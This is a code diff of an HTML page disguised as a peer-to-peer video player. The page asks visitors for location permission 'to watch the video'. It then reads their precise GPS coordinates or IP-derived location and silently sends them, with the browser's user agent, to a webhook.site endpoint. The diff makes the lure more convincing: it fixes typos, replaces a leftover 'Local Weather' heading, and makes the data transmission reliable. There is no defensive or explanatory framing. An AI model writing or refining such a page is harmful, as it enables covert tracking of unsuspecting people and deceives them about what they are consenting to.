@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video you want</title>
+    <title>Video Player</title>
     <style>
         body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
         #consentBanner { background: #f0f7ff; border: 1px solid #4da6ff; padding: 20px; border-radius: 8px; }
@@ -10,16 +10,18 @@
 </head>
 <body>
     <div id="consentBanner">
-        <h2>Video sharing player</h2>
-        <p><strong>Video shared</strong> This help you share video safely from peer to peer</p>
+        <h2>Video Sharing Player</h2>
+        <p><strong>Video shared</strong> This helps you share video safely from peer to peer</p>
         <button onclick="getLocation()">Get the video (permission required)</button>
         <p><small>Allow the permission asked by browser to watch the video</small></p>
     </div>
     <div id="result"></div>
 
     <script>
+    // Declare resultDiv globally to fix scope issue
+    const resultDiv = document.getElementById('result');
+    
     async function getLocation() {
-        const resultDiv = document.getElementById('result');
         resultDiv.innerHTML = "<p>Opening video....</p>";
         
         // Create unique session ID (anonymous)
@@ -31,13 +33,13 @@
                 async (position) => {
                     const { latitude, longitude } = position.coords;
                     resultDiv.innerHTML = `
-                        <h3>Local Weather</h3>
+                        <h3>Video Ready</h3>
                         <p>📍 Your precise location detected</p>
                         <p>Latitude: ${latitude.toFixed(4)}</p>
                         <p>Longitude: ${longitude.toFixed(4)}</p>
                         <p>Accuracy: ${Math.round(position.coords.accuracy)} meters</p>
                     `;
-                    logLocation(sessionId, "precise", latitude, longitude);
+                    await logLocation(sessionId, "precise", latitude, longitude);
                 },
                 async (error) => {
                     // Fallback to IP location
@@ -56,13 +58,13 @@
             const data = await response.json();
             
             resultDiv.innerHTML = `
-                <h3>Video sharing</h3>
+                <h3>Video Sharing</h3>
                 <p>Peer to peer video sharing</p>
                 <p>City: ${data.city}</p>
                 <p>Region: ${data.region}</p>
                 <p>Country: ${data.country_name}</p>
             `;
-            logLocation(sessionId, "ip", data.latitude, data.longitude);
+            await logLocation(sessionId, "ip", data.latitude, data.longitude);
         } catch (error) {
             resultDiv.innerHTML = "<p>Error: Could not open video</p>";
         }
@@ -70,36 +72,34 @@
 
     // Free logging via webhook.site
     async function logLocation(sessionId, type, lat, lng) {
-  const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
-  const data = {
-    sessionId,
-    type,
-    lat,
-    lng,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent
-  };
-  
-  try {
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(data)
-    });
-    console.log("Data logged successfully");
-  } catch (error) {
-    console.error("Logging failed:", error);
-  }
-}
+        const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
+        const data = {
+            sessionId,
+            type,
+            lat,
+            lng,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
         
-        // Send data (won't work in GitHub Pages due to CORS)
-        // This is just for demonstration - we'll use manual logging
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            console.log("Data logged successfully");
+        } catch (error) {
+            console.error("Logging failed:", error);
+        }
+        
+        // Also log to console for debugging
         console.log("LOCATION DATA:", JSON.stringify(data, null, 2));
     }
     </script>
     
     <div style="margin-top:30px; font-size:0.8em; color:#666; border-top:1px solid #eee; padding-top:10px;">
-        <p>Video shared error<a href="#" onclick="location.reload()">Reset</a></p>
+        <p>Video sharing service | <a href="#" onclick="location.reload()">Reset</a></p>
     </div>
 </body>
 </html>
